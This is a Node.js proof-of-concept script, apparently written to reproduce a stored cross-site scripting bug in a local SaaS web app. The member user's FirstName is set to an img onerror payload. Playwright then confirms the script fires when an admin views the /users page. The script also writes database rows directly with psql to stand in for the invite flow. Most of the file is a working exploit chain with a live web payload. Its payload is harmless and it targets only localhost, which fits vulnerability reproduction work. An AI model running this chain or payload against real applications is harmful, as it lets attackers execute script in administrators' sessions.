/**
 * Stored XSS: an account member sets FirstName, an admin opens /users.
 *
 * Prereq: web-api on :3001, web-app on :3000, Postgres on 127.0.0.1:5433
 * database "shared", Redis on 127.0.0.1:6379.
 *
 * The disabled mailer drops invite links, so this script creates the member
 * with POST /v1/users and inserts the users_accounts row the invite handler
 * would have written (role user, status active) on the admin's account.
 */
import { createRequire } from "node:module";
import { execFileSync } from "node:child_process";
import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { randomUUID } from "node:crypto";

const here = dirname(fileURLToPath(import.meta.url));
const evidenceDir = join(here, "evidence");
mkdirSync(evidenceDir, { recursive: true });

const require = createRequire(import.meta.url);
const playwrightCore =
  process.env.PLAYWRIGHT_CORE ||
  "/home/node/.npm/_npx/e41f203b7505f1fb/node_modules/playwright-core";
const { chromium } = require(playwrightCore);
const chromePath =
  process.env.CHROME_PATH ||
  "/home/node/.cache/ms-playwright/chromium-1234/chrome-linux/chrome";

const API = process.env.API || "http://127.0.0.1:3001";
const APP = process.env.APP || "http://127.0.0.1:3000";
const PSQL = process.env.PSQL || "/usr/lib/postgresql/17/bin/psql";
const PASSWORD = "Local-repro-1!";
const stamp = Date.now().toString(36);
const adminEmail = `admin-xss-${stamp}@example.test`;
const memberEmail = `member-xss-${stamp}@example.test`;
const PAYLOAD = `<img src=x onerror="document.documentElement.dataset.pwned='saas19'">`;

async function api(path, { method = "GET", json, form, token } = {}) {
  const headers = {};
  let body;
  if (json) {
    headers["Content-Type"] = "application/json";
    body = JSON.stringify(json);
  }
  if (form) {
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    body = new URLSearchParams(form);
  }
  if (token) headers.Authorization = `Bearer ${token}`;
  const response = await fetch(API + path, { method, headers, body });
  const text = await response.text();
  let parsed = null;
  try {
    parsed = JSON.parse(text);
  } catch {
    parsed = null;
  }
  return { status: response.status, text, parsed };
}

function psql(sql) {
  return execFileSync(
    PSQL,
    ["-h", "127.0.0.1", "-p", "5433", "-U", "postgres", "-d", "shared", "-v", "ON_ERROR_STOP=1", "-c", sql],
    { encoding: "utf8" },
  );
}

const adminSignup = await api("/v1/signup", {
  method: "POST",
  json: {
    account: {
      name: `xss-acct-${stamp}`,
      address1: "103 East Main St",
      city: "Valdez",
      region: "AK",
      country: "USA",
      zipcode: "99686",
    },
    user: {
      first_name: "Admin",
      last_name: "Viewer",
      email: adminEmail,
      password: PASSWORD,
      password_confirm: PASSWORD,
    },
  },
});
if (adminSignup.status !== 201 && adminSignup.status !== 200) {
  throw new Error(`admin signup ${adminSignup.status} ${adminSignup.text.slice(0, 500)}`);
}
const accountId = adminSignup.parsed.account.id;
const adminToken = (
  await api("/v1/oauth/token", {
    method: "POST",
    form: { username: adminEmail, password: PASSWORD },
  })
).parsed.access_token;

const memberCreate = await api("/v1/users", {
  method: "POST",
  token: adminToken,
  json: {
    first_name: "Benign",
    last_name: "Member",
    email: memberEmail,
    password: PASSWORD,
    password_confirm: PASSWORD,
  },
});
if (memberCreate.status !== 201 && memberCreate.status !== 200) {
  throw new Error(`member create ${memberCreate.status} ${memberCreate.text.slice(0, 800)}`);
}
const memberId = memberCreate.parsed.id;
psql(
  `INSERT INTO users_accounts (id, account_id, user_id, roles, status, created_at, updated_at)
   VALUES ('${randomUUID()}', '${accountId}', '${memberId}', '{user}', 'active', now(), now());`,
);

const browser = await chromium.launch({ executablePath: chromePath, headless: true });

async function login(context, email) {
  const page = await context.newPage();
  await page.goto(`${APP}/user/login`, { waitUntil: "domcontentloaded" });
  await page.fill('input[name="Email"]', email);
  await page.fill('input[name="Password"]', PASSWORD);
  // The login control is a <button> with no type attribute.
  await page.click("form.user button");
  await page.waitForLoadState("domcontentloaded");
  if (page.url().includes("/user/login")) {
    writeFileSync(join(evidenceDir, `login-failed-${email}.html`), await page.content());
    throw new Error(`login stayed on /user/login for ${email}`);
  }
  return page;
}

async function setName(page, firstName) {
  await page.goto(`${APP}/user/update`, { waitUntil: "domcontentloaded" });
  await page.fill('input[name="FirstName"]', firstName);
  await page.fill('input[name="LastName"]', "Member");
  await page.click("#btnSubmit");
  await page.waitForLoadState("domcontentloaded");
  return page.url();
}

const memberContext = await browser.newContext();
const memberPage = await login(memberContext, memberEmail);
const benignUrl = await setName(memberPage, "Benign");

const adminContext = await browser.newContext();
const adminPage = await login(adminContext, adminEmail);
await adminPage.goto(`${APP}/users`, { waitUntil: "domcontentloaded" });
await adminPage.waitForTimeout(1500);
const control = await adminPage.evaluate(() => ({
  pwned: document.documentElement.dataset.pwned || null,
  imgs: document.querySelectorAll("img").length,
  textHasBenign: document.body.innerText.includes("Benign"),
}));

const payloadUrl = await setName(memberPage, PAYLOAD);
await adminPage.goto(`${APP}/users`, { waitUntil: "domcontentloaded" });
await adminPage.waitForFunction(
  () => document.documentElement.dataset.pwned === "saas19",
  { timeout: 15000 },
);
const exploit = await adminPage.evaluate(() => ({
  pwned: document.documentElement.dataset.pwned || null,
  onerror: document.querySelector("img[onerror]")?.getAttribute("onerror") || null,
  cell: document.querySelector("img[onerror]")?.closest("td")?.innerHTML || null,
}));

const result = {
  reproduced: exploit.pwned === "saas19" && !control.pwned ? "yes" : "no",
  adminEmail,
  memberEmail,
  accountId,
  memberId,
  benignUrl,
  payloadUrl,
  control,
  exploit,
};
writeFileSync(join(evidenceDir, "result.json"), JSON.stringify(result, null, 2));
console.log(JSON.stringify({ reproduced: result.reproduced, control, pwned: exploit.pwned }, null, 2));
await browser.close();
if (result.reproduced !== "yes") process.exit(1);
